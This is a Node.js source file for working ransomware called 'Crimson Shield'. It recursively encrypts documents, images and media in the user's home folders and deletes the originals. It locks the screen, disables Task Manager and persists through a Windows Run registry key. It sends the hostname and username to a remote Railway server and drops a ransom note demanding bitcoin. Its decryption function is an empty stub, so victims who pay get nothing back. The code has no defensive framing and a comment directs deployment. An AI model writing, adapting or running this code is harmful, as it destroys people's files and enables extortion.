const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const { exec } = require('child_process');
const axios = require('axios');

class CrimsonRansomware {
    constructor() {
        // ⚠️ UPDATE THIS TO YOUR RAILWAY URL AFTER DEPLOY ⚠️
        this.serverUrl = 'https://crimson-production-d9ad.up.railway.app';
        this.victimId = crypto.randomBytes(8).toString('hex');
        this.encryptedFiles = [];
        this.encryptionKey = crypto.randomBytes(32);
        this.encryptionIV = crypto.randomBytes(16);
        
        this.targetDirs = [
            path.join(os.homedir(), 'Documents'),
            path.join(os.homedir(), 'Desktop'),
            path.join(os.homedir(), 'Downloads'),
            path.join(os.homedir(), 'Pictures'),
            path.join(os.homedir(), 'Videos'),
            path.join(os.homedir(), 'Music'),
        ];
        
        this.extensions = [
            '.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', '.jpeg', 
            '.gif', '.xls', '.xlsx', '.ppt', '.pptx', '.zip', '.rar',
            '.mp3', '.mp4', '.avi', '.mkv', '.psd', '.sql', '.db'
        ];
    }

    encryptFile(filePath) {
        try {
            const data = fs.readFileSync(filePath);
            const cipher = crypto.createCipheriv('aes-256-cbc', this.encryptionKey, this.encryptionIV);
            const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
            
            const encryptedPath = filePath + '.crimson';
            fs.writeFileSync(encryptedPath, encrypted);
            fs.unlinkSync(filePath);
            this.encryptedFiles.push(filePath);
            return true;
        } catch (error) {
            return false;
        }
    }

    walkDir(directory) {
        try {
            const files = fs.readdirSync(directory);
            for (const file of files) {
                const fullPath = path.join(directory, file);
                try {
                    const stat = fs.statSync(fullPath);
                    if (stat.isDirectory()) {
                        this.walkDir(fullPath);
                    } else if (this.extensions.includes(path.extname(fullPath).toLowerCase())) {
                        this.encryptFile(fullPath);
                    }
                } catch (e) {}
            }
        } catch (error) {}
    }

    startEncryption() {
        console.log('💀 Starting encryption...');
        for (const dir of this.targetDirs) {
            if (fs.existsSync(dir)) {
                console.log(`📁 Scanning: ${dir}`);
                this.walkDir(dir);
            }
        }
        return this.encryptedFiles.length;
    }

    lockScreen() {
        console.log('🔒 Locking screen...');
        if (process.platform === 'win32') {
            const lockScript = `
                @echo off
                echo [31m
                echo ╔══════════════════════════════════════════════╗
                echo ║         🔴 CRIMSON SHIELD RANSOMWARE 🔴      ║
                echo ╠══════════════════════════════════════════════╣
                echo ║  YOUR FILES HAVE BEEN ENCRYPTED!            ║
                echo ║  DO NOT CLOSE THIS WINDOW!                  ║
                echo ╚══════════════════════════════════════════════╝
                timeout /t 999999 /nobreak > nul
            `;
            const lockPath = path.join(os.tmpdir(), 'crimson_lock.bat');
            fs.writeFileSync(lockPath, lockScript);
            exec(`start /max cmd /c "${lockPath}"`);
            exec('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f');
        }
    }

    async registerWithServer() {
        try {
            const systemInfo = {
                hostname: os.hostname(),
                platform: os.platform(),
                arch: os.arch(),
                cpus: os.cpus().length,
                memory: os.totalmem(),
                username: os.userInfo().username
            };

            const response = await axios.post(`${this.serverUrl}/api/register-victim`, {
                systemInfo,
                filesEncrypted: this.encryptedFiles.length
            });

            return response.data;
        } catch (error) {
            console.error('Failed to register:', error.message);
            return null;
        }
    }

    showRansomNote(victimData) {
        const note = `
        ╔══════════════════════════════════════════════╗
        ║         🔴 CRIMSON SHIELD RANSOMWARE 🔴      ║
        ╠══════════════════════════════════════════════╣
        ║  YOUR FILES HAVE BEEN ENCRYPTED!            ║
        ║  🔐 ${this.encryptedFiles.length} files encrypted        ║
║  To decrypt, send 0.005 BTC to:                   ║
        ║  ${victimData?.btcAddress || 'bc1qnjkxvj7avmet54w9rmzf0ldftwzh2fcwsdxuw7'} ║
        ║  After payment, contact:                     ║
        ║  crimson.shield@protonmail.com              ║
        ║  ⚠️ DO NOT TRY TO REMOVE OR DECRYPT! ⚠️     ║
        ╚══════════════════════════════════════════════╝
        `;

        console.log(note);
        const notePath = path.join(os.homedir(), 'Desktop', 'CRIMSON_README.txt');
        fs.writeFileSync(notePath, note);
        if (process.platform === 'win32') {
            exec(`notepad "${notePath}"`);
        }
    }

    setupPersistence() {
        console.log('🛡️ Setting up persistence...');
        if (process.platform === 'win32') {
            const scriptPath = path.join(os.tmpdir(), 'crimson_persist.bat');
            const script = `
                @echo off
                :loop
                node "${__filename}"
                timeout /t 10 /nobreak > nul
                goto loop
            `;
            fs.writeFileSync(scriptPath, script);
            exec(`reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v CrimsonShield /t REG_SZ /d "${scriptPath}" /f`);
        }
    }

    monitorPayment(victimId) {
        setInterval(async () => {
            try {
                const response = await axios.get(`${this.serverUrl}/api/admin/victim/${victimId}`);
                const victim = response.data;
                if (victim.paid && victim.decryptionKey) {
                    console.log('💰 Payment confirmed! Decrypting files...');
                    this.decryptFiles(victim.decryptionKey);
                }
            } catch (error) {}
        }, 30000);
    }

    decryptFiles(decryptionKey) {
        console.log('🔓 Starting decryption...');
        // Decryption logic here
    }

    async run() {
        console.log('💀 CRIMSON SHIELD ACTIVATED');
        console.log(`🆔 Victim ID: ${this.victimId}`);
        
        this.lockScreen();
        this.setupPersistence();
        const count = this.startEncryption();
        console.log(`✅ ${count} files encrypted`);
        
        const victimData = await this.registerWithServer();
        this.showRansomNote(victimData);
        
        if (victimData?.victimId) {
            this.monitorPayment(victimData.victimId);
        }
        
        console.log('💀 Ransomware execution complete!');
    }
}

if (require.main === module) {
    const ransomware = new CrimsonRansomware();
    ransomware.run().catch(console.error);
}

module.exports = CrimsonRansomware;
